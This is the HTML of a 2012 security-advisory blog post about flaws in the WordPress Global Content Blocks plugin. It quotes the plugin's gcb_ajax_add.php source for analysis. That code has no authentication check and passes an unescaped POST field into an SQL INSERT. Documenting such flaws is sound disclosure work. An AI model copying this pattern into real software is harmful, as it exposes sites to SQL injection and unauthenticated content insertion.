<!DOCTYPE html>
<!--[if IE 6]>
<html id="ie6" lang="en-US">
<![endif]-->
<!--[if IE 7]>
<html id="ie7" lang="en-US">
<![endif]-->
<!--[if IE 8]>
<html id="ie8" lang="en-US">
<![endif]-->
<!--[if !(IE 6) | !(IE 7) | !(IE 8)  ]><!-->
<html lang="en-US">
<!--<![endif]-->
<head>
<base href="https://charlieeriksen.github.io" />

<meta charset="UTF-8" />
<meta name="viewport" content="initial-scale=1.0, width=device-width" />
<title>WordPress Global Content Blocks multiple vulnerabilities | ceriksen.com</title>

<link rel="stylesheet" type="text/css" media="all" href="https://charlieeriksen.github.io/wp-content/themes/simplex/style.css" />

<!--[if lt IE 9]>
<script src="https://charlieeriksen.github.io/wp-content/themes/simplex/js/html5.js" type="text/javascript"></script>
<script src="https://charlieeriksen.github.io/wp-content/themes/simplex/js/css3-mediaqueries.js"></script>
<![endif]-->



<link rel='stylesheet' id='crayon-css'  href='https://charlieeriksen.github.io/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=2.5.0' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-theme-twilight-css'  href='https://charlieeriksen.github.io/wp-content/plugins/crayon-syntax-highlighter/themes/twilight/twilight.css?ver=2.5.0' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://charlieeriksen.github.io/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=2.5.0' type='text/css' media='all' />
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/jquery/jquery.js?ver=1.10.2'></script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var quicktagsL10n = {"closeAllOpenTags":"Close all open tags","closeTags":"close tags","enterURL":"Enter the URL","enterImageURL":"Enter the URL of the image","enterImageDescription":"Enter a description of the image","fullscreen":"fullscreen","toggleFullscreen":"Toggle fullscreen mode","textdirection":"text direction","toggleTextdirection":"Toggle Editor Text Direction"};
/* ]]> */
</script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/quicktags.min.js?ver=3.8.3'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var CrayonSyntaxSettings = {"version":"2.5.0","is_admin":"0","ajaxurl":"http:\/\/ceriksen.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
var CrayonTagEditorSettings = {"home_url":"http:\/\/ceriksen.com","css":"crayon-te","css_selected":"crayon-selected","code_css":"#crayon-code","url_css":"#crayon-url","url_info_css":"#crayon-te-url-info","lang_css":"#crayon-lang","title_css":"#crayon-title","mark_css":"#crayon-mark","range_css":"#crayon-range","inline_css":"crayon-inline","inline_hide_css":"crayon-hide-inline","inline_hide_only_css":"crayon-hide-inline-only","hl_css":"#crayon-highlight","switch_html":"#content-html","switch_tmce":"#content-tmce","tinymce_button":"a.mce_crayon_tinymce","submit_css":"#crayon-te-ok","cancel_css":"#crayon-te-cancel","content_css":"#crayon-te-content","dialog_title_css":"#crayon-te-title","submit_wrapper_css":"#crayon-te-submit-wrapper","data_value":"data-value","attr_sep":":","css_sep":"_","fallback_lang":"default","dialog_title_add":"Add Crayon Code","dialog_title_edit":"Edit Crayon Code","submit_add":"Add","submit_edit":"Save","bar":"#crayon-te-bar","bar_content":"#crayon-te-bar-content","extensions":{"scpt":"applescript","applescript":"applescript","swf":"as","fla":"as","cs":"c#","h":"c++","hh":"c++","hpp":"c++","hxx":"c++","h++":"c++","cc":"c++","cpp":"c++","cxx":"c++","c++":"c++","pas":"delphi","java":"java","class":"java","jar":"java","mv":"miva","mvc":"miva","mvt":"miva","m":"objc","mm":"objc","pl":"perl","py":"python","pyw":"python","pyc":"python","pyo":"python","pyd":"python","rb":"ruby","rbx":"ruby","rhtml":"ruby","vbs":"vb"}};
var CrayonSyntaxSettings = {"version":"2.5.0","is_admin":"0","ajaxurl":"http:\/\/ceriksen.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
/* ]]> */
</script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.te.min.js?ver=2.5.0'></script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-includes/js/comment-reply.min.js?ver=3.8.3'></script>
<script type='text/javascript' src='https://charlieeriksen.github.io/wp-content/themes/simplex/lib/js/jquery.fitvids.js?ver=3.8.3'></script>

 

<link rel='next' title='WordPress Paid Memberships Pro information disclosure vulnerability' href='https://charlieeriksen.github.io/2012/07/13/wordpress-paid-memberships-pro-information-disclosure-vulnerability/' />

<link rel='canonical' href='https://charlieeriksen.github.io/2012/07/12/wordpress-global-content-blocks-multiple-vulnerabilities/' />
<link rel='shortlink' href='https://charlieeriksen.github.io/?p=37' />
<script type="text/javascript">
var _gaq = _gaq || [];
_gaq.push(['_setAccount', 'UA-32892239-1']);
_gaq.push(['_trackPageview']);
(function() {
var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
})();
</script>

	<script type="text/javascript">
		jQuery(document).ready(function(){
			jQuery("#page").fitVids();	 
		});
	</script>	<style type="text/css">
			#site-title a,
		#site-description {
			color: #e6941e !important;
		}
		</style>
	
</head>

<body lang="en" class="single single-post postid-37 single-format-standard  single-author singular">
<div id="page" class="hfeed">
	<header id="branding" role="banner">
		<hgroup>
			<h1 id="site-title"><a href="https://charlieeriksen.github.io/" title="ceriksen.com" rel="home">ceriksen.com</a></h1>
			<h2 id="site-description"></h2>
						
							<form role="search" method="get" id="searchform" class="searchform" action="https://charlieeriksen.github.io/">
				<div>
					<label class="screen-reader-text" for="s">Search for:</label>
					<input type="text" value="" name="s" id="s" />
					<input type="submit" id="searchsubmit" value="Search" />
				</div>
			</form>					</hgroup>
		
		<nav id="access" role="navigation">
			<h2 class="assistive-text">Main menu</h2>
			<div class="skip-link screen-reader-text"><a href="#content" title="Skip to content">Skip to content</a></div>

			<div class="menu"><ul><li ><a href="https://charlieeriksen.github.io/">Home</a></li></ul></div>

		</nav><!-- #access -->
		<div class="clear"></div>
	</header><!-- #branding -->

	<div id="main">
		<div id="primary">
			<div id="content" role="main">

			
				
				
<article id="post-37" class="post-37 post type-post status-publish format-standard hentry category-advisories tag-global-content-blocks tag-wordpress-plugin">
	<header class="entry-header">
				<h2 class="entry-title">WordPress Global Content Blocks multiple vulnerabilities</h2>
		
		<div class="entry-meta">
			<a href="https://charlieeriksen.github.io/2012/07/12/wordpress-global-content-blocks-multiple-vulnerabilities/" title="12:01 pm" rel="bookmark" class="entry-date"><time datetime="2012-07-12T12:01:22+00:00" pubdate>July 12, 2012</time></a>		</div><!-- .entry-meta -->
	</header><!-- .entry-header -->

	<div class="entry-content">
				<p><strong>Advisory</strong><br />
<a href="http://secunia.com/advisories/49854/">Secunia Advisory SA 49854</a></p>
<p><strong>Analysis of gcb_ajax_add.php vulnerability</strong><br />
A part of the admin interface for this plugin allows you to insert a &#8220;content block&#8221;, which can be used across WordPress to contain reusable blocks of content and PHP code. It does so by making a POST call to <a href="http://plugins.svn.wordpress.org/global-content-blocks/tags/1.5.1/resources/tinymce/gcb_ajax_add.php">/resources/tinymce/gcd_ajax_add.php</a>. Let&#8217;s have a quick look at that to see how it works.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878c5524e873635259" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
require_once('../../../../../wp-load.php');
global $wpdb;

if(!isset($_POST["name"]) || !isset($_POST["content"])) {die("invalid call!");}

$name = $_POST["name"];
$description = mysql_real_escape_string(htmlspecialchars($_POST['description']));
$type = mysql_real_escape_string(htmlspecialchars($_POST['type']));
$value = mysql_real_escape_string(htmlspecialchars($_POST['content']));

if(!strlen($name) || !strlen($value)) {die("invalid call!");}

$available_types = array(
            "other"=&gt;array("vname"=&gt;"General","img"=&gt;"gcb.png","help"=&gt;"Content block"),
            "adsense"=&gt;array("vname"=&gt;"Adsense","img"=&gt;"adsense.png","help"=&gt;"Adsense code"),
            "code"=&gt;array("vname"=&gt;"Code","img"=&gt;"code.png","help"=&gt;"Programming code"),
            "form"=&gt;array("vname"=&gt;"Form","img"=&gt;"form.png","help"=&gt;"General form"),
            "html"=&gt;array("vname"=&gt;"HTML","img"=&gt;"html.png","help"=&gt;"Raw HTML code"),
            "iframe"=&gt;array("vname"=&gt;"Iframe","img"=&gt;"iframe.png","help"=&gt;"Iframe code"),
            "optin"=&gt;array("vname"=&gt;"Opt-In Form","img"=&gt;"optin.png","help"=&gt;"Opt-In form code"),
            "php"=&gt;array("vname"=&gt;"PHP Code","img"=&gt;"php.png","help"=&gt;"PHP code (without &lt;!--?php, &lt;?, ?--&gt; tags)"),
        );

$wpdb-&gt;query("insert into ".$wpdb-&gt;prefix . "gcb (name,description,value,type) VALUES ('".$name."','".$description."','".$value."','".$type."')");

$inserted_id = mysql_insert_id();

$return = array(
"id"=&gt;$inserted_id,
"name"=&gt;$name,
"img"=&gt;$available_types[$type]["img"]
);

echo json_encode($return);die();</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878c5524e873635259-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878c5524e873635259-2">2</div><div class="crayon-num" data-line="crayon-53c9878c5524e873635259-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878c5524e873635259-4">4</div><div class="crayon-num" data-line="crayon-53c9878c5524e873635259-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878c5524e873635259-6">6</div><div class="crayon-num" data-line="crayon-53c9878c5524e873635259-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878c5524e873635259-8">8</div><div class="crayon-num" data-line="crayon-53c9878c5524e873635259-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878c5524e873635259-10">10</div><div class="crayon-num" data-line="crayon-53c9878c5524e873635259-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878c5524e873635259-12">12</div><div class="crayon-num" data-line="crayon-53c9878c5524e873635259-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878c5524e873635259-14">14</div><div class="crayon-num" data-line="crayon-53c9878c5524e873635259-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878c5524e873635259-16">16</div><div class="crayon-num" data-line="crayon-53c9878c5524e873635259-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878c5524e873635259-18">18</div><div class="crayon-num" data-line="crayon-53c9878c5524e873635259-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878c5524e873635259-20">20</div><div class="crayon-num" data-line="crayon-53c9878c5524e873635259-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878c5524e873635259-22">22</div><div class="crayon-num" data-line="crayon-53c9878c5524e873635259-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878c5524e873635259-24">24</div><div class="crayon-num" data-line="crayon-53c9878c5524e873635259-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878c5524e873635259-26">26</div><div class="crayon-num" data-line="crayon-53c9878c5524e873635259-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878c5524e873635259-28">28</div><div class="crayon-num" data-line="crayon-53c9878c5524e873635259-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878c5524e873635259-30">30</div><div class="crayon-num" data-line="crayon-53c9878c5524e873635259-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878c5524e873635259-32">32</div><div class="crayon-num" data-line="crayon-53c9878c5524e873635259-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878c5524e873635259-34">34</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878c5524e873635259-1"><span class="crayon-e">require_once</span><span class="crayon-sy">(</span><span class="crayon-s">'../../../../../wp-load.php'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878c5524e873635259-2"><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878c5524e873635259-3">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878c5524e873635259-4"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">"name"</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">||</span><span class="crayon-h"> </span><span class="crayon-o">!</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">"content"</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-e">die</span><span class="crayon-sy">(</span><span class="crayon-s">"invalid call!"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c9878c5524e873635259-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878c5524e873635259-6"><span class="crayon-sy">$</span><span class="crayon-v">name</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">"name"</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878c5524e873635259-7"><span class="crayon-sy">$</span><span class="crayon-v">description</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">mysql_real_escape_string</span><span class="crayon-sy">(</span><span class="crayon-e">htmlspecialchars</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'description'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878c5524e873635259-8"><span class="crayon-sy">$</span><span class="crayon-v">type</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">mysql_real_escape_string</span><span class="crayon-sy">(</span><span class="crayon-e">htmlspecialchars</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'type'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878c5524e873635259-9"><span class="crayon-sy">$</span><span class="crayon-v">value</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">mysql_real_escape_string</span><span class="crayon-sy">(</span><span class="crayon-e">htmlspecialchars</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'content'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878c5524e873635259-10">&nbsp;</div><div class="crayon-line" id="crayon-53c9878c5524e873635259-11"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-e">strlen</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">name</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">||</span><span class="crayon-h"> </span><span class="crayon-o">!</span><span class="crayon-e">strlen</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">value</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-e">die</span><span class="crayon-sy">(</span><span class="crayon-s">"invalid call!"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878c5524e873635259-12">&nbsp;</div><div class="crayon-line" id="crayon-53c9878c5524e873635259-13"><span class="crayon-sy">$</span><span class="crayon-v">available_types</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">array</span><span class="crayon-sy">(</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878c5524e873635259-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"other"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-s">"vname"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"General"</span><span class="crayon-sy">,</span><span class="crayon-s">"img"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"gcb.png"</span><span class="crayon-sy">,</span><span class="crayon-s">"help"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"Content block"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9878c5524e873635259-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"adsense"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-s">"vname"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"Adsense"</span><span class="crayon-sy">,</span><span class="crayon-s">"img"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"adsense.png"</span><span class="crayon-sy">,</span><span class="crayon-s">"help"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"Adsense code"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878c5524e873635259-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"code"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-s">"vname"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"Code"</span><span class="crayon-sy">,</span><span class="crayon-s">"img"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"code.png"</span><span class="crayon-sy">,</span><span class="crayon-s">"help"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"Programming code"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9878c5524e873635259-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"form"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-s">"vname"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"Form"</span><span class="crayon-sy">,</span><span class="crayon-s">"img"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"form.png"</span><span class="crayon-sy">,</span><span class="crayon-s">"help"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"General form"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878c5524e873635259-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"html"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-s">"vname"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"HTML"</span><span class="crayon-sy">,</span><span class="crayon-s">"img"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"html.png"</span><span class="crayon-sy">,</span><span class="crayon-s">"help"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"Raw HTML code"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9878c5524e873635259-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"iframe"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-s">"vname"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"Iframe"</span><span class="crayon-sy">,</span><span class="crayon-s">"img"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"iframe.png"</span><span class="crayon-sy">,</span><span class="crayon-s">"help"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"Iframe code"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878c5524e873635259-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"optin"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-s">"vname"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"Opt-In Form"</span><span class="crayon-sy">,</span><span class="crayon-s">"img"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"optin.png"</span><span class="crayon-sy">,</span><span class="crayon-s">"help"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"Opt-In form code"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9878c5524e873635259-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"php"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-t">array</span><span class="crayon-sy">(</span><span class="crayon-s">"vname"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"PHP Code"</span><span class="crayon-sy">,</span><span class="crayon-s">"img"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"php.png"</span><span class="crayon-sy">,</span><span class="crayon-s">"help"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-s">"PHP code (without &lt;!--?php, &lt;?, ?--&gt; tags)"</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878c5524e873635259-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878c5524e873635259-23">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878c5524e873635259-24"><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">query</span><span class="crayon-sy">(</span><span class="crayon-s">"insert into "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-v">prefix</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-s">"gcb (name,description,value,type) VALUES ('"</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">name</span><span class="crayon-sy">.</span><span class="crayon-s">"','"</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">description</span><span class="crayon-sy">.</span><span class="crayon-s">"','"</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">value</span><span class="crayon-sy">.</span><span class="crayon-s">"','"</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-v">type</span><span class="crayon-sy">.</span><span class="crayon-s">"')"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878c5524e873635259-25">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878c5524e873635259-26"><span class="crayon-sy">$</span><span class="crayon-v">inserted_id</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">mysql_insert_id</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878c5524e873635259-27">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878c5524e873635259-28"><span class="crayon-sy">$</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">array</span><span class="crayon-sy">(</span></div><div class="crayon-line" id="crayon-53c9878c5524e873635259-29"><span class="crayon-s">"id"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-sy">$</span><span class="crayon-i">inserted_id</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878c5524e873635259-30"><span class="crayon-s">"name"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-sy">$</span><span class="crayon-i">name</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-53c9878c5524e873635259-31"><span class="crayon-s">"img"</span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-sy">$</span><span class="crayon-v">available_types</span><span class="crayon-sy">[</span><span class="crayon-sy">$</span><span class="crayon-i">type</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-s">"img"</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878c5524e873635259-32"><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878c5524e873635259-33">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878c5524e873635259-34"><span class="crayon-e">echo </span><span class="crayon-e">json_encode</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-st">return</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-e">die</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0190 seconds] -->
